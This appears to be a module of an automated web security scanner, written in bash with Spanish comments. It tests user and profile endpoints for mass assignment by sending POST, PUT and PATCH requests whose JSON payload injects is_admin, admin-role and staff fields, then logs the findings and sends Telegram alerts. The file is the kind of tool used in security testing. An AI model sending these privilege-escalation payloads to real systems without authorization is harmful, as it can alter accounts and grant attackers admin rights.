#!/usr/bin/env bash
# modules/55_mass_assignment.sh — Tier 3.9 Mass assignment / property pollution
MODULE_NAME="mass_assignment"
MODULE_DESC="Mass assignment — extra fields (is_admin, role, password_hash)"

_ma_finding() {
  db_add_finding "$1" "mass_assignment" "$5" "$3" "$4" "$6" "${7:-medium}" 2>/dev/null
  log_warn "  ⚡ [$5/${7:-medium}] MassAssign $4: $3"
  if [[ "${7:-medium}" != "low" ]] && [[ "$5" == "critical" || "$5" == "high" ]]; then
    _telegram_send "🔴 *MassAssign — $4*
🌐 \`$2\` 🔗 \`$3\`
📋 ${6:0:250}
📊 \`${5^^}\`/\`${7:-medium}\`" 2>/dev/null || true
  fi
}

_ma_probe() {
  local URL="$1" DOMAIN_ID="$2" DOMAIN="$3"
  local CANARY="hackdr_$(openssl rand -hex 4)"

  # Payload con campos privilegiados inyectados
  local PAYLOAD='{"name":"'"$CANARY"'","email":"hackdr@hackeadora-test.invalid","is_admin":true,"isAdmin":true,"role":"admin","permissions":["admin","superuser"],"email_verified":true,"emailVerified":true,"account_active":true,"is_staff":true,"isStaff":true,"verified":true}'

  for METHOD in POST PUT PATCH; do
    _h_method_noredirect "$METHOD" "$URL" --connect-timeout 8 \
      -H "Content-Type: application/json" --data "$PAYLOAD"
    local STATUS="$HTTP_LAST_STATUS" BODY="${HTTP_LAST_BODY:0:3000}"

    [[ ! "$STATUS" =~ ^(200|201|204)$ ]] && continue

    # Si response refleja los campos privilegiados → mass assignment (response disclosure)
    if echo "$BODY" | grep -qiE '"is_admin":\s*true|"role":\s*"admin"|"is_staff":\s*true|"emailVerified":\s*true' && \
       echo "$BODY" | grep -qF "$CANARY"; then
      _ma_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "mass_assignment_${METHOD}" "critical" \
        "Mass assignment confirmado en ${METHOD}: response refleja is_admin/role/staff campos inyectados junto con canary '${CANARY}'. Privilege escalation. Body sample: ${BODY:0:200}" \
        "high"
      return 0
    fi
    # 200 sin reflexion: posible silent acceptance
    if [[ "$STATUS" =~ ^(200|201)$ ]] && echo "$BODY" | grep -qF "$CANARY"; then
      _ma_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "mass_assignment_silent_${METHOD}" "medium" \
        "Endpoint ${METHOD} acepta payload con is_admin/role/etc — response no muestra esos campos pero canary '${CANARY}' sí presente. Verificar GET subsiguiente para confirmar." \
        "medium"
    fi
  done
  return 1
}

module_run() {
  local DOMAIN="$1" DOMAIN_ID="$2" OUT_DIR="$3"
  log_phase "Módulo 55 — $MODULE_DESC: $DOMAIN"
  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null
  local CANDIDATES
  CANDIDATES=$(sqlite3 "$DB_PATH" "
    SELECT DISTINCT url FROM urls
    WHERE domain_id=${DOMAIN_ID}
      AND (url LIKE '%/users%' OR url LIKE '%/profile%' OR url LIKE '%/account%'
           OR url LIKE '%/settings%' OR url LIKE '%/api/me%' OR url LIKE '%/api/users%'
           OR url LIKE '%/api/profile%' OR url LIKE '%/api/customer%')
      AND url NOT LIKE '%.css%' AND url NOT LIKE '%.js%' AND url NOT LIKE '%.png%'
    LIMIT 15;" 2>/dev/null | sort -u)
  [[ -z "$CANDIDATES" ]] && { log_info "  Sin endpoints user-modifiable candidatos"; return 0; }
  local TOTAL=0
  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue
    _ma_probe "${URL%%\?*}" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL++))
  done <<< "$CANDIDATES"
  log_ok "$MODULE_DESC: $TOTAL"
}
